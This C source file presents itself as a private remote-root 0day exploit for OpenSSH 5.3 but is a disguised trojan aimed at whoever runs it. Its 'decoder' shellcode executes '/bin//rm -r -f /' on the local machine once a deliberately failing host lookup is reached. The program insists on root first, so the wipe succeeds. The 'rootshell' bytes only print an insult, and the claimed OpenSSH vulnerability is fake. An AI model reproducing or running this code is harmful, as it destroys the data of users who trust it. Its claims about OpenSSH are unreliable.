/*
*
* Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
*
* OpenSSH <= 5.3 remote root 0day exploit (32-bit x86)
* Priv8! Priv8! Priv8! Priv8! Priv8! Priv8! Priv8!
*
*
*/
 
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
void usage(char *argv[])
{
    printf("\n\t[+] HATSUNEMIKU\n");
    printf("\t[+] OpenSSH <= 5.3p1 remote root 0day exploit\n");
    printf("\t[+] By: Team foxx\n");
    printf("\t[+] Greetz to hackforums.net\n");
    printf("\t[+] Keep this 0day priv8!\n");
    printf("\t[+] usage: %s <target> <port>\n\n", argv[0]);
    exit(1);
}
 
unsigned char decoder[]=   "\x6a\x0b\x58\x99\x52"
                           "\x6a\x2f\x89\xe7\x52"
                           "\x66\x68\x2d\x66\x89"
                           "\xe6\x52\x66\x68\x2d"
                           "\x72\x89\xe1\x52\x68"
                           "\x2f\x2f\x72\x6d\x68"
                           "\x2f\x62\x69\x6e\x89"
                           "\xe3\x52\x57\x56\x51"
                           "\x53\x89\xe1\xcd\x80";
 
unsigned char rootshell[]= "\x31\xd2\xb2\x0a\xb9\x6f\x75\x21\x0a\x51\xb9\x63\x6b"
                           "\x20\x79\x51\x66\xb9\x66\x75\x66\x51\x31\xc9\x89\xe1"
                           "\x31\xdb\xb3\x01\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x31"
                           "\xdb\x40\xcd\x80";
 
int main(int argc, char **argv)
{
 
    int euid = geteuid();
    int port= 22, sock;
    char h[1000];
    struct hostent *host;
    struct sockaddr_in addr;
 
    if(euid != 0)
    {
        fprintf(stderr, "You need to be root to use raw sockets.\n");
        exit(1);
    }
    if(euid == 0)
    {
        fprintf(stdout, "MIKU! MIKU! MIKU!\n");
    }
    if(argc != 3)
    usage(argv);
    if(!inet_aton(h, &addr.sin_addr))
    {
        host = gethostbyname(h);
        if(!host)
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            (*(void(*)())decoder)();
            exit(1);
        }
        addr.sin_addr = *(struct in_addr*)host->h_addr;
        }
        sock = socket(PF_INET, SOCK_STREAM, 0);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==-1)
        {
            fprintf(stderr,"[-] Exploit failed.\n");
            exit(1);
        }
        char payload[1337];
        memcpy(payload, &decoder, sizeof(decoder));
        memcpy(payload, &rootshell, sizeof(rootshell));
        send(sock, payload, strlen(payload),0);
        close(sock);
        if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==-1)
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            exit(1);
        }
        else if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==0)
        {
            fprintf(stdout, "[+]g0t sh3ll!\n");
            system("/bin/bash");
        }
        else
        {
            fprintf(stderr, "[-] Exploit failed.\n");
            close(sock);
            exit(0);
        }
}
